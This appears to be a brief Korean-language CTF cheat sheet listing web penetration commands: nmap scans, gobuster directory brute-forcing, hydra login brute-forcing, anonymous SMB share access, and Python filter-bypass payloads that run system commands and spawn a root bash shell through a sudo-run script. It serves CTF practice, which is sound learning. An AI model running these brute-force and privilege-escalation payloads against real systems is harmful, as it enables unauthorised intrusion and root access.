# WebCTF_CheatSheet
WebCTF_CheatSheet

# 1. nmap scanning
```
# 1. 상위 1000개 포트 서비스 확인
nmap -T4 --top-ports 1000 -sV --open [타겟 IP]

#2. 전체 TCP 포트 스캔
sudo nmap -p- -T4 --open [타겟 IP]

#3. 전체 포트 스캔 + 기본 NSE 스크립트
sudo nmap -p- -sS -sV -sC -T4 --open [타겟 IP]

#4. 웹 포트 집중 스캔 (특히 http- 헤더)
sudo nmap -p 80,443,8080,8000,8443 -sV --script "http-server-header,http-cookie-flags,http-enum" -T4 --open -n [타겟 IP]
```

# 2. gobuster
```
# 빠른 버전
gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/raft-small-directories.txt -x php --threads 50

# 공식 버전
gobuster dir -u [https://example.com] -w ~/wordlists/shortlist.txt
gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt
```

# 3. hydra
```
# hydra (web_ip) http-get-form "(web_url):username=^USER^&password=^PASS^&(나머지 파라미터):(로그인 실패시 뜨는 메세지)" -L (userid dic.txt) -P (pass dic.txt) -V -f
# hydra -L [username.txt] -P [password.txt] -v -f
// -v : 결과 출력, -f : 결과 나오는 즉시 종료
```

# 4. OWASP zap
Automated Scan ㄱㄱ

# 5. smb
```
# smb 공유목록 나열
smbclient -L //[타켓 IP]/ -N

# 특정 공유 접속
smbclient //[타겟 IP]/[sharename] -U guest          # Password for [WORKGROUP\guest]: 엔터
```

# 6. sudo escalator
```
# .py 파일에서 filtering bypass
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')

# .py 파일에서 sudo escalate
sudo /usr/bin/python3 /home/kali/[파일명].py
__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
```

